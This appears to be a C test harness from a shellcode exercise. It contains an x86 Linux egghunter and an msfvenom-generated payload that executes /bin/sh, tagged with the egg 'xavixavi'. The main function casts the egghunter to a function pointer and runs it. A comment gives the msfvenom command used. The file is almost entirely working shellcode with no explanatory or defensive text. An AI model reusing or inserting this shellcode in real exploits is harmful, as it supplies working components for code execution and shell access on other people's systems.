#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \
"\x66\x81\xca\xff\x0f\x42\x89\xd3\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xee\x81\x3a\x78\x61\x76\x69\x75\xeb\x81\x7a\x04\x78\x61\x76\x69\x75\xe2\x8d\x52\x08\xff\xe2";

unsigned char shellcode[] = \
"xavixavi" //EGG
"\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" // msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00
"\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac"
"\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54"
"\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf"
"\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2";


main()
{

	printf("Egghunter Length: %d\n",strlen(egghunter));
	printf("Shellcode Length: %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
